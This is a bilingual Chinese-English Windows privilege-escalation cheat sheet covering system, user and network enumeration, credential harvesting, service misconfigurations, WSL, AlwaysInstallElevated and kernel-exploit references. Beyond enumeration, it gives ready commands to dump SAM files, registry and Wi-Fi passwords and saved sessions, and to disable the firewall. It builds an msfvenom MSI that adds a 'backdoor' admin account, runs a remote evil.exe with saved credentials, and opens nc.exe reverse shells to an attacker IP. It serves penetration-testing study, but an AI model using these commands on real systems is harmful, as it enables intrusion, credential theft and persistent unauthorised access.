### 权限提升

提权(Privilege Escalation) 

权限提升 (EoP, Elevation of Privilege)

本地提权(LPE, Local Privilege Escalation)


### Checklists - Windows提权之前必要信息搜集

#### Windows 版本和配置
```
Windows Version and Configuration
# ---------------
# 查看综合信息
systeminfo

# 查看系统名称（windows系统 中文版）
systeminfo | findstr /B /C:"OS 名称" /C:"OS Version"

# 查看系统名称（windows系统 英文版）
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# ---------------
# Architecture
# 查询架构 不同语言的系统都通用

wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
如结果
OSArchitecture
64-bit

# ---------------
# List all env variables
# 查看所有环境变量

set

# 第三方powershell脚本 如
Get-ChildItem Env: | ft Key,Value

# ---------------
# List all drives
# 列出所有磁盘

wmic logicaldisk get caption || fsutil fsinfo drives

# 解释
# 命令wmic logicaldisk get caption 会获取:硬盘(本地磁盘)、移动存储设备(软盘驱动器 DVD驱动器)、网络位置(网络驱动器)
# 命令fsutil fsinfo drives 需要管理员权限 只会获取:硬盘(本地磁盘)、移动存储设备(软盘驱动器 DVD驱动器)   不会获取:网络位置(网络驱动器)
```

#### 用户枚举

```
User Enumeration
# ---------------
# Get current username
# 获取当前的用户名

echo %USERNAME% || whoami
$env:username

# ---------------
# List user privilege
# 获取用户权限

whoami /priv

# ---------------
# List all users
# 列出所有用户

net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

# ---------------
# List logon requirements; useable for bruteforcing
# 列出登录要求; 可用于暴力枚举

net accounts
如结果
强制用户在时间到期之后多久必须注销?:     从不
密码最短使用期限(天):                    0
密码最长使用期限(天):                    42
密码长度最小值:                          0
保持的密码历史记录长度:                  None
锁定阈值:                                从不
锁定持续时间(分):                        30
锁定观测窗口(分):                        30
计算机角色:                              WORKSTATION

# ---------------
# Get details about a user (i.e. administrator, admin, current user)
# 获取某个用户的详细信息（如administrator admin 当前用户）

net user administrator
net user admin
net user %USERNAME%

# ---------------
# List all local groups

net localgroup

# 第三方脚本
Get-LocalGroup | ft Name

# ---------------
# Get details about a group (i.e. administrators)
# 获取一个用户组的的详细信息

net localgroup administrators

# 第三方脚本
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

#### 网络枚举

```
Network Enumeration
# ---------------
# List all network interfaces, IP, and DNS.
# 列出所有网卡 IP DNS

ipconfig /all
如结果
Windows IP Configuration
   Host Name . . . . . . . . . . . . : b33f
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
Ethernet adapter Bluetooth Network Connection:
   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)
   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-56-79-35
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM
   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM
   Default Gateway . . . . . . . . . : 192.168.0.1
   DHCP Server . . . . . . . . . . . : 192.168.0.1
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35
   DNS Servers . . . . . . . . . . . : 192.168.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled


# 第三方脚本
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft



# ---------------
# List current routing table
# 列出当前路由表

route print

# 第三方脚本
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex


# ---------------
# List the ARP table
# 列出ARP表

# arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.
# arp -A 显示所有可用网卡的ARP（地址解析协议）缓存表

arp -A

# 第三方脚本
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

# ---------------
# List all current connections
# 列出所有当前连接

netstat -ano

# ---------------
# List firewall state and current configuration
# 列出防火墙状态和当前配置

netsh advfirewall firewall dump

netsh firewall show state

netsh firewall show config

# ---------------
# List firewall's blocked ports
# 列出防火墙的 封掉的端口 (powershell命令)

$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

# ---------------
# Disable firewall
# 禁用防火墙

netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

# ---------------
# 列出驱动程序
# This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.
# 这有时很有用，列出第三方驱动程序，即使是信誉良好的公司也可能包含不少漏洞，比如Swiss cheese。因为ring0开发不在大多数人的专业知识之内。

DRIVERQUERY

# ---------------
# List all network shares
# 列出所有网络共享

net share

# ---------------
# SNMP Configuration
# SNMP配置

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

# 第三方脚本
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

```


### EoP - Windows各种提权方式

#### EoP - 密码搜集

```
# ---------------
# SAM and SYSTEM files
# SAM和SYSTEM文件

%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# ---------------
# Search for file contents
# 搜索文件内容

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*



# ---------------
# Search for a file with a certain filename
# 搜索具有特定文件名的文件

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini


# ---------------
# Search the registry for key names and passwords
# 在注册表中搜索key名称和密码

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


# ---------------
# Read a value of a certain sub key
# 读取某个子键的值

REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList


# ---------------
# Passwords in unattend.xml
# unattend.xml中的密码

# Location of the unattend.xml files.
# unattend.xml文件的位置
# The Metasploit module post/windows/gather/enum_unattend looks for these files.
# MSF模块post/windows/gather/enum_unattend可查找这些文件

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# 示例内容

<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>

# 解码上述内容中的base64得到密码

$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*



# ---------------
# IIS Web config
# IIS Web配置

# 第三方脚本
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

# 文件
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config


# ---------------
# Other files
# 其他文件

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b


# ---------------
# Wifi passwords
# Wifi密码

# Find AP SSID

netsh wlan show profile

# Get Cleartext Pass

netsh wlan show profile <SSID> key=clear

# Oneliner method to extract wifi passwords from all the access point.

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on



# ---------------
# Passwords stored in services
# 存储在服务中的密码

# Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
# 使用SessionGopher保存PuTTY，WinSCP，FileZilla，SuperPuTTY和RDP的会话信息

# 第三方脚本
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

#### EoP - Processes Enumeration and Tasks

进程枚举 和 任务
```
# ---------------
# List Processes

# What processes are running?
# 哪些进程正在运行？

tasklist /v

# Which processes are running as "system"
# 哪些进程作为SYSTEM运行

tasklist /v /fi "username eq system"


# 第三方脚本
# 进程枚举 - 根据名称查找  如查找名为"Sysmon"的进程进程信息 注意Sysmon安装时可自定义进程名称
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

# 进程枚举 - 根据名称查找
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize



# ---------------
# List services
# 服务枚举 - 系统命令 查看已经启动的 Windows 服务
net start

# 服务枚举 - 系统命令
sc query
wmic service list brief
tasklist /SVC


# 第三方脚本
# 服务枚举 - 根据描述查找
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"

# 服务枚举 - 根据名称查找
Get-Service | where-object {$_.DisplayName -like "*sysm*"}

# ---------------
# Do you have powershell magic?
# 查看powershell版本信息

REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion

# ---------------
# List installed programs
# 列出已安装的程序

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name


# ---------------

# Scheduled tasks
# 计划任务

schtasks /query /fo LIST 2>nul | findstr TaskName

# 第三方脚本
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State


# Startup tasks
# 自启动任务

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

#### EoP - Incorrect permissions in services

服务中的不正确权限

```
# ---------------
# A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
# 以Administrator/SYSTEM身份运行且具有不正确文件权限的服务可能允许EoP(权限提升)。你可以替换二进制文件，并重新启动服务，实现权限提升。

# Often, services are pointing to writeable locations:
# 通常，服务指向可写位置：

# 1.Orphaned installs, not installed anymore but still exist in startup(孤儿installs,即现在并没有安装但仍存在于startup中)
# 2.DLL Hijacking
# 3.PATH directories with weak permissions(具有弱权限的PATH目录)


$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt


# Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions
# 或者，您可以使用Metasploit的：exploit/windows/local/service_permissions

# 注意 检查权限的命令为
icacls (Windows Vista +)
cacls (Windows XP)

# 期望找到的是
BUILTIN\Users:(F)   -  (Full access)
BUILTIN\Users:(M)   -  (Modify access)
BUILTIN\Users:(W)   -   (Write-only access)
```


#### EoP - Windows Subsystem for Linux (WSL)

Windows子系统
```
# ---------------
# With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). 
# 使用root权限的Windows Subsystem for Linux（WSL）允许用户在任何端口上创建bind shell（无需权限提升）

# Don't know the root password? No problem just set the default user to root W/ .exe --default-user root.
# 不知道root的密码也没问题，只需将默认用户设置为root

# Now start your bind shell or reverse.
# 启动bind shell或 reverse shell


wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'


# 二进制bash.exe文件在C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe

# Alternatively you can explore the WSL filesystem in the folder 
# 或者，您可以在文件夹中浏览WSL的文件系统

C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\

```

#### EoP - Unquoted Service Paths

EoP - 不带引号的服务路径
```
# ---------------
# 原理:
# Abusing misconfigured services
# 滥用错误配置的服务

# The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. 
# Microsoft Windows未加引号的服务路径枚举漏洞

# All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.
# 所有Windows服务都有一个可执行文件的路径。如果该路径未加引号并包含空格或其他分隔符，则服务将"首先"尝试访问父路径中的资源。


# 根据Windows处理CreateProcess这个API调用的方式来看，如果某个服务的"二进制文件的路径"没有用引号括起来，并且路径中有空白符号(空格等)或其他分隔符号，可能被用来提权。
# 参考https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa


# 例如 某个服务的二进制文件的路径为 C:\Program Files\sub dir\program name 可见这一路径没有被引号括住并且路径中含有空格 Windows尝试路径的顺序为：

C:\Program.exe
C:\Program Files\sub.exe
C:\Program Files\sub dir\program.exe
c:\program files\sub dir\program name.exe

# ---------------
# 实践:

# cmd命令 查看哪个服务的二进制文件没有被引号括住(如果该服务的权限高 则可能利用该错误配置进行Windows提权)
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# Powershell命令 参考https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

# Metasploit provides the exploit : exploit/windows/local/trusted_service_path
# Metasploit提供了一个模块: exploit/windows/local/trusted_service_path
```


#### EoP - Kernel Exploitation

EoP - 内核利用

利用内核漏洞 参考合集 https://github.com/SecWiki/windows-kernel-exploits

如下

 #Security Bulletin&nbsp;&nbsp;&nbsp;#KB &nbsp;&nbsp;&nbsp;&nbsp;#Description&nbsp;&nbsp;&nbsp;&nbsp;#Operating System  
- [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
- [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
- [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833)   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)
- [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120)   [Win32k Elevation of Privilege Vulnerability]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)
- [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010) 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
- [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135) 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
- [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111) 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
- [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
- [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075) 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
- [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034) 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
- [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
- [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016) 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
- [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014) 　[K3134228]　　[remote code execution]　　(2008/Vista/7)    



#### EoP - AlwaysInstallElevated

```
# ---------------
# Check if these registry values are set to "1".
# 检查这些注册表值是否设置为“1”。

$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Then create an MSI package and install it.
# 然后创建一个MSI包并安装它。

$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi

# 可以使用Metasploit的 exploit/windows/local/always_install_elevated
```


#### EoP - Insecure GUI apps

EoP - 不安全的GUI应用程序

```
# ---------------
# Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
# 作为SYSTEM运行的应用程序允许用户生成CMD或浏览目录。

# Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
# 示例：“Windows帮助和支持”（Windows + F1），搜索“命令提示符”，单击“单击以打开命令提示符”
```

#### EoP - Runas

```
# ---------------
# Use the cmdkey to list the stored credentials on the machine.
# 使用cmdkey列出计算机上存储的凭据

cmdkey /list
如结果
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator


# Then you can use runas with the /savecred options in order to use the saved credentials. 
# The following example is calling a remote binary via an SMB share.
# 然后，您可以用runas 的 /savecred 选项，以便使用保存的凭据。
# 以下示例通过SMB共享调用远程二进制文件。

runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"


# Using runas with a provided set of credential.

C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"


$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

#### EoP - Common Vulnerabilities and Exposure

通用漏洞

|名称|类型|适用环境|描述|
|:-------------:|--|--|-----|
|Token Impersonation (RottenPotato)|/|/|/|
|MS08-067 (NetAPI)|系统漏洞|Windows 2000/XP/Server 2003/Vista/Server 2008)|Remote Code Execution|
|MS16-032|系统漏洞|windows 7/8/10/2008/2012|Secondary Logon Handle. 补丁编号: KB3143141|
|MS17-010 (Eternal Blue)|系统漏洞|/|Windows Kernel Mode Drivers|windows 7/2008/2003/XP|补丁编号: KB4013389|
|CVE-2018-8120|Kernel Exploitation|(Windows 7 SP1/2008 SP2,2008 R2 SP1)x86 x64|[Win32k Elevation of Privilege Vulnerability]|
|[Win10Pcap-Exploit](https://github.com/Rootkitsmm/Win10Pcap-Exploit)|应用程序漏洞|win10|Exploit Win10Pcap Driver to enable some Privilege in our process token ( local Privilege escalation)|


检查补丁是否安装 `wmic qfe list | findstr "3139914"`


详细参考 [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#token-impersonation-rottenpotato)

